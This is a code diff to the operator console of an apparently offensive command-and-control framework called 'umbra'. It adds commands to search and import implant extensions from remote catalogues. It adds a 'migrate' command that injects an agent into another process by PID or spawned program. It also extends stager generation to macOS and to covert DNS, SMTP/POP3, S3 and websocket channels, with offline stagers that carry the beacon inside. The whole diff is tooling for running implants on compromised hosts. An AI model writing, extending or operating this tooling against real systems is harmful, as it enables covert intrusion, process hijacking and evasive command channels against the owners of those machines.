@@ -500,11 +500,13 @@ def print_armory(payload: Dict[str, Any]) -> None:
             e.get("arch", "?"),
             e.get("format", "?"),
             e.get("size", 0),
+            short(",".join(e.get("caps") or []), 20) or "-",
             short(e.get("description", ""), 40),
         ]
         for e in entries
     ]
-    print(table(["NAME", "VERSION", "OS", "ARCH", "FORMAT", "SIZE", "DESCRIPTION"], rows))
+    print(table(
+        ["NAME", "VERSION", "OS", "ARCH", "FORMAT", "SIZE", "NEEDS", "DESCRIPTION"], rows))
     print("installed:")
     rows = [
         [
@@ -517,6 +519,42 @@ def print_armory(payload: Dict[str, Any]) -> None:
         for e in installed
     ]
     print(table(["NAME", "VERSION", "SIZE", "SHA256", "INSTALLED"], rows))
+
+
+def print_armory_needs(payload: Dict[str, Any]) -> None:
+    """Render what a module needs: the host capabilities and the arguments."""
+    print(f"module  : {payload.get('name')} {payload.get('version', '')}".rstrip())
+    print(f"format  : {payload.get('format', '?')}")
+    print(f"platform: {payload.get('os', '?')} / {payload.get('arch', '?')}")
+    print(f"digest  : {payload.get('digest', '')}")
+    caps = payload.get("caps") or []
+    print(f"needs   : {', '.join(caps) if caps else 'nothing (it runs anywhere)'}")
+    print("arguments:")
+    schema = payload.get("args") or payload.get("schema") or []
+    rows = [
+        [
+            a.get("name", "?"),
+            a.get("type", "?"),
+            "yes" if a.get("required") else "no",
+            a.get("default", "-"),
+            short(a.get("help", ""), 40),
+        ]
+        for a in schema
+    ]
+    if rows:
+        print(table(["NAME", "TYPE", "REQUIRED", "DEFAULT", "HELP"], rows))
+    else:
+        print("  (none)")
+    output = payload.get("output") or {}
+    if output.get("type"):
+        print(f"answers : {output.get('type')}"
+              f"{' - ' + output['description'] if output.get('description') else ''}")
+    requires = payload.get("requires") or []
+    if requires:
+        print(f"depends : {', '.join(requires)}")
+    missing = payload.get("missing") or []
+    if missing:
+        print(f"missing : {', '.join(missing)} (not in the catalogue)")
 
 
 def print_aliases(aliases: List[Dict[str, Any]]) -> None:
@@ -1103,6 +1141,22 @@ class Console:
                 sub_cmd = rest[0] if rest else "list"
                 if sub_cmd == "list":
                     print_armory(self.client.armory_list())
+                elif sub_cmd == "search" and len(rest) >= 2:
+                    payload = self.client.armory_search(" ".join(rest[1:]))
+                    print_armory({"entries": payload.get("entries", []),
+                                  "installed": [], "verified": True})
+                elif sub_cmd == "needs" and len(rest) >= 2:
+                    print_armory_needs(self.client.armory_needs(rest[1]))
+                elif sub_cmd == "versions" and len(rest) >= 2:
+                    data = self.client.armory_versions(rest[1])
+                    print(f"{data.get('name')}: "
+                          f"{', '.join(data.get('versions') or []) or 'no versions'}")
+                elif sub_cmd == "resolve" and len(rest) >= 2:
+                    data = self.client.armory_resolve(rest[1])
+                    print(f"install order: {' -> '.join(data.get('order') or [])}")
+                elif sub_cmd == "import" and len(rest) >= 2:
+                    data = self.client.armory_import(rest[1])
+                    print(f"imported {data.get('entries')} entries from {data.get('url', '')}")
                 elif sub_cmd == "install" and len(rest) >= 2:
                     data = self.client.armory_install(rest[1])
                     print(f"installed {data.get('name')} ({data.get('size')} bytes)")
@@ -1114,7 +1168,9 @@ class Console:
                     self.note_task(task_id, rest[2], f"armory:{rest[1]}")
                     print(f"queued {task_id}")
                 else:
-                    print("usage: armory [list | install <name> | remove <name> | run <name> <agent>]")
+                    print("usage: armory [list | search <text> | needs <name> | "
+                          "versions <name> | resolve <name> | import <url> | "
+                          "install <name> | remove <name> | run <name> <agent>]")
             elif cmd == "alias":
                 sub_cmd = rest[0] if rest else "list"
                 if sub_cmd == "list":
@@ -1127,6 +1183,28 @@ class Console:
                     print("usage: alias [list | run <name> <agent>]")
             elif cmd in ("team-sync", "team"):
                 print_team(self.client.team_sync())
+            elif cmd == "migrate":
+                if len(rest) < 1:
+                    print("usage: migrate <agent> [--pid N] [--spawn PROG] [--out]")
+                    return True
+                parts = {}
+                for token in rest[1:]:
+                    if token.startswith("--") and "=" in token:
+                        key, _, value = token[2:].partition("=")
+                        parts[key.replace("-", "_")] = value
+                task_args = {"mode": "migrate"}
+                if parts.get("pid"):
+                    task_args["pid"] = int(parts["pid"])
+                if parts.get("spawn"):
+                    task_args["spawn"] = parts["spawn"]
+                if parts.get("out") in ("1", "true", "yes"):
+                    task_args["out"] = True
+                if parts.get("resume") in ("1", "true", "yes"):
+                    task_args["resume"] = True
+                agent = self._resolve(rest[1])
+                task_id = self.client.submit(agent, "inject", task_args)
+                self.note_task(task_id, agent, "inject:migrate", task_args)
+                print(f"queued {task_id} for {agent}")
             elif cmd == "stager":
                 parts = dict()
                 for token in rest:
@@ -1140,6 +1218,15 @@ class Console:
                     url=parts.get("url", ""),
                     sha256=parts.get("sha256", ""),
                     agent_id=parts.get("agent_id", ""),
+                    mode=parts.get("mode", "download"),
+                    store=parts.get("store", ""),
+                    store_base=parts.get("store_base", ""),
+                    dns_domain=parts.get("dns_domain", ""),
+                    dns_resolver=parts.get("dns_resolver", ""),
+                    smtp_addr=parts.get("smtp_addr", ""),
+                    pop3_addr=parts.get("pop3_addr", ""),
+                    s3_endpoint=parts.get("s3_endpoint", ""),
+                    s3_region=parts.get("s3_region", ""),
                 )
                 print(script)
             elif cmd == "stats":
@@ -1258,9 +1345,10 @@ def print_help() -> None:
   pivot [list|open|close|claims|release]
                           pivot through an agent (socks5 / port forward)
   vpn [status|peers|alloc|routes|route|ping]  the layer-3 tunnel
-  armory [list|inst|rm|run] the extension store
+  armory [list|search|needs|versions|resolve|import|inst|rm|run] the extension store
   alias [list|run]          saved commands
   team-sync                 one snapshot of the team
+  migrate <agent>           move the work of an agent into another process
   stager [options]          render a stager script
   db [action] [value]       the local notebook (stats|tasks|results|notes|search|note)
   raw <cmd> [json]          send a raw RPC
@@ -1732,10 +1820,12 @@ def build_parser() -> argparse.ArgumentParser:
 
     # -- extension store -------------------------------------------------
     armory = sub.add_parser("armory", help="the extension store")
-    armory.add_argument("action", choices=["list", "install", "remove", "run"])
+    armory.add_argument("action", choices=["list", "search", "needs", "versions",
+                                           "resolve", "import", "install", "remove", "run"])
     armory.add_argument("name", nargs="?", default="", help="extension name")
     armory.add_argument("agent", nargs="?", default="", help="agent id (run)")
     armory.add_argument("--args", default="{}", help="task arguments as JSON (run)")
+    armory.add_argument("--url", default="", help="the url of a remote catalogue (import)")
 
     # -- command namespace ------------------------------------------------
     alias = sub.add_parser("alias", help="saved commands")
@@ -1748,14 +1838,45 @@ def build_parser() -> argparse.ArgumentParser:
 
     sub.add_parser("team-sync", help="one snapshot of the team (agents, operators, chat)")
 
+    # -- process migration -------------------------------------------------
+    migrate = sub.add_parser("migrate",
+                             help="move the work of an agent into another process")
+    migrate.add_argument("agent")
+    migrate.add_argument("--pid", type=int, default=0,
+                         help="the process that is taken over")
+    migrate.add_argument("--spawn", default="",
+                         help="the program the agent starts itself")
+    migrate.add_argument("--out", action="store_true",
+                         help="the agent leaves its own process")
+    migrate.add_argument("--resume", action="store_true",
+                         help="the original program of the target keeps running")
+    migrate.add_argument("--args", default="{}",
+                         help="task arguments as JSON (the payload lives here)")
+    migrate.add_argument("--wait", action="store_true")
+    migrate.add_argument("--timeout", type=float, default=120.0)
+
     # -- stagers ----------------------------------------------------------
     stager = sub.add_parser("stager", help="render a stager script")
-    stager.add_argument("--platform", default="windows", choices=["windows", "linux"])
-    stager.add_argument("--transport", default="tcp", choices=["tcp", "http"])
+    stager.add_argument("--platform", default="windows", choices=["windows", "linux", "macos"])
+    stager.add_argument("--transport", default="tcp",
+                        choices=["tcp", "http", "ws", "dns", "smtp", "s3"])
     stager.add_argument("--server", default="", help="agent listener (host:port)")
     stager.add_argument("--url", default="", help="url the stager downloads from")
     stager.add_argument("--sha256", default="", help="sha256 of the payload the stager fetches")
     stager.add_argument("--agent-id", default="", help="agent id to bake into the stager")
+    stager.add_argument("--mode", default="download",
+                        choices=["download", "store", "offline", "shim"],
+                        help="download, store (the file store of the server), "
+                             "offline (the beacon travels inside) or shim (the digest check)")
+    stager.add_argument("--store", default="", help="name of the beacon in the file store")
+    stager.add_argument("--store-base", default="", help="base url of the server that holds the store")
+    stager.add_argument("--dns-domain", default="", help="the domain the dns tunnel answers for")
+    stager.add_argument("--dns-resolver", default="", help="the resolver of the dns tunnel")
+    stager.add_argument("--smtp-addr", default="", help="the smtp server of the mail transport")
+    stager.add_argument("--pop3-addr", default="", help="the pop3 server of the mail transport")
+    stager.add_argument("--s3-endpoint", default="", help="the endpoint of the object store")
+    stager.add_argument("--s3-region", default="", help="the region of the object store")
+    stager.add_argument("--payload", default="", help="path of the beacon for the offline stager")
 
     # -- interactive sessions ---------------------------------------------
     session = sub.add_parser("session", help="open an interactive session on an agent")
@@ -2675,6 +2796,50 @@ def main(argv: Optional[List[str]] = None) -> int:
                     emit(data)
                 else:
                     print_armory(data)
+            elif args.action == "search":
+                data = client.armory_search(args.name or "")
+                if args.json:
+                    emit(data)
+                else:
+                    print_armory({"entries": data.get("entries", []),
+                                  "installed": [], "verified": True})
+            elif args.action == "needs":
+                if not args.name:
+                    print("usage: umbra armory needs <name>", file=sys.stderr)
+                    return 2
+                data = client.armory_needs(args.name)
+                if args.json:
+                    emit(data)
+                else:
+                    print_armory_needs(data)
+            elif args.action == "versions":
+                if not args.name:
+                    print("usage: umbra armory versions <name>", file=sys.stderr)
+                    return 2
+                data = client.armory_versions(args.name)
+                if args.json:
+                    emit(data)
+                else:
+                    versions = ", ".join(data.get("versions") or []) or "no versions"
+                    print(f"{data.get('name')}: {versions}")
+            elif args.action == "resolve":
+                if not args.name:
+                    print("usage: umbra armory resolve <name>", file=sys.stderr)
+                    return 2
+                data = client.armory_resolve(args.name)
+                if args.json:
+                    emit(data)
+                else:
+                    print(f"install order: {' -> '.join(data.get('order') or [])}")
+            elif args.action == "import":
+                if not args.url:
+                    print("usage: umbra armory import <url>", file=sys.stderr)
+                    return 2
+                data = client.armory_import(args.url)
+                if args.json:
+                    emit(data)
+                else:
+                    print(f"imported {data.get('entries')} entries from {args.url}")
             elif args.action == "install":
                 if not args.name:
                     print("usage: umbra armory install <name>", file=sys.stderr)
@@ -3016,7 +3181,43 @@ def main(argv: Optional[List[str]] = None) -> int:
                 emit(data)
             else:
                 print_team(data)
+        elif args.cmd == "migrate":
+            try:
+                task_args = json.loads(args.args)
+            except json.JSONDecodeError as exc:
+                print(f"invalid --args json: {exc}", file=sys.stderr)
+                return 2
+            if not isinstance(task_args, dict):
+                print("--args must be a JSON object", file=sys.stderr)
+                return 2
+            task_args["mode"] = "migrate"
+            if args.pid:
+                task_args["pid"] = args.pid
+            if args.spawn:
+                task_args["spawn"] = args.spawn
+            if args.out:
+                task_args["out"] = True
+            if args.resume:
+                task_args["resume"] = True
+            task_id = client.submit(args.agent, "inject", task_args)
+            console.note_task(task_id, args.agent, "inject:migrate", task_args)
+            if args.json and not args.wait:
+                emit({"task_id": task_id, "agent": args.agent, "kind": "inject"})
+            else:
+                print(f"queued {task_id}")
+            if args.wait:
+                result = client.wait_for_result(task_id, timeout=args.timeout)
+                console.note_result(task_id, result)
+                emit(result) if args.json else print_task_result(result)
         elif args.cmd == "stager":
+            payload = b""
+            if args.payload:
+                try:
+                    with open(args.payload, "rb") as handle:
+                        payload = handle.read()
+                except OSError as exc:
+                    print(f"cannot read {args.payload}: {exc}", file=sys.stderr)
+                    return 2
             script = client.stager_generate(
                 platform=args.platform,
                 transport=args.transport,
@@ -3024,6 +3225,16 @@ def main(argv: Optional[List[str]] = None) -> int:
                 url=args.url,
                 sha256=args.sha256,
                 agent_id=args.agent_id,
+                mode=args.mode,
+                store=args.store,
+                store_base=args.store_base,
+                dns_domain=args.dns_domain,
+                dns_resolver=args.dns_resolver,
+                smtp_addr=args.smtp_addr,
+                pop3_addr=args.pop3_addr,
+                s3_endpoint=args.s3_endpoint,
+                s3_region=args.s3_region,
+                payload=payload,
             )
             print(script)
         else:  # pragma: no cover - argparse covers this
